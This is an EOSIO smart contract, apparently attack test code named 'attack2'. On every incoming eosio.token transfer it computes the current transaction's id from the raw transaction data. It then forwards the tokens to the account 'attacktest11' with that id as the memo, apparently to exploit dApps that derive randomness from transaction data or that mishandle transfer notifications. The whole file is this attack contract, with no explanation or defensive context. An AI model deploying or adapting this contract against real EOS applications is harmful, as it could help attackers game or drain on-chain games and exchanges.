#include <eosiolib/eosio.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/transaction.hpp>
#include <eosiolib/crypto.h>

using namespace eosio;
using namespace std;

class attack2 : public contract
{
  public:
    using contract::contract;

    void transfer(account_name from, account_name to, asset quantity, string memo)
    {
        if (to == _self) {
            string send_memo = get_transaction_id();
            action(permission_level{ _self, N(active) },
            N(eosio.token),
            N(transfer),
            make_tuple(_self, N(attacktest11), quantity, send_memo)).send();
        }
    }
  private:
    string to_hex(const char* d, uint32_t s)
    {
        std::string r;
        const char* to_hex = "0123456789abcdef";
        uint8_t* c = (uint8_t*)d;
        for (uint32_t i = 0; i < s; ++i)
            (r += to_hex[(c[i] >> 4)]) += to_hex[(c[i] & 0x0f)];
        return r;
    }

    string sha256_to_hex(const checksum256& sha256)
    {
        return to_hex((char*)sha256.hash, sizeof(sha256.hash));
    }

    string get_transaction_id()
    {
        checksum256 h;
        auto size = transaction_size();
        char buf[size];
        uint32_t read = read_transaction( buf, size );
        eosio_assert( size == read, "read_transaction failed");
        sha256(buf, read, &h);
        return sha256_to_hex(h);
    }
};

extern "C" {
    void apply( uint64_t receiver, uint64_t code, uint64_t action ) {
        attack2 thiscontract(receiver);
        if ( action == N(transfer) && code == N(eosio.token) )
        {
            execute_action(&thiscontract, &attack2::transfer);
            return;
        }
    }
}